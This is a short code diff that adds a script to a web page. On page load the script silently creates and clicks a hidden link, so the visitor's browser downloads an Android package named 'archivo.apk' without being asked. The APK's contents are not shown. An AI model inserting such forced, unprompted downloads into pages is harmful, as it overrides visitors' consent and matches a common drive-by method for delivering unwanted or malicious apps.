@@ -96,6 +96,16 @@
       changeImage();
     }
   }, 5000);
+  
+  // Descarga del archivo APK al cargar la página
+  window.onload = function() {
+    var link = document.createElement('a');
+    link.href = 'archivo.apk'; // Ruta del archivo APK
+    link.download = 'archivo.apk'; // Nombre del archivo APK
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  };
 </script>
 </body>
 </html>
